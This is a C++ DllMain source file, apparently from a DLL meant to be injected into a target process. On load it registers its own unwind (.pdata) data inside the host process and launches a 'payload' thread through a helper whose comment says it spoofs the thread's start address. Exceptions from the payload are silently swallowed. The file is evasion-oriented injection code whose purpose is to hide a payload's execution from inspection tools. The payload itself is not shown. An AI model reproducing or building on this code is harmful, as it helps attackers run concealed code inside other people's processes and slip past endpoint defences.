// DllMain.cpp -- P1-01: g_hSelfBase, P1-02: RegisterOwnPdata, P1-04: TlsThreadCreate.

#include <windows.h>
#include <new>
#include "TlsThread.h"
#include "PdataReg.h"

HMODULE g_hSelfBase = nullptr;
bp::DynamicPdata g_pdata{};

void PayloadMain(HMODULE hBase);

namespace {

DWORD WINAPI PayloadThread(LPVOID) {
    Sleep(500);
    __try {
        PayloadMain(g_hSelfBase);
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
    return 0;
}

} // namespace

BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID /*reserved*/) {
    if (reason == DLL_PROCESS_ATTACH) {
        g_hSelfBase = hMod;
        // P1-02: Register dynamic .pdata inside target process covering only our range
        g_pdata = bp::RegisterOwnPdata(hMod);

        // P1-04: use TlsThreadCreate for thread start spoofing
        HANDLE t = payload::TlsThreadCreate(PayloadThread, nullptr);
        if (t) CloseHandle(t);
    }
    return TRUE;
}
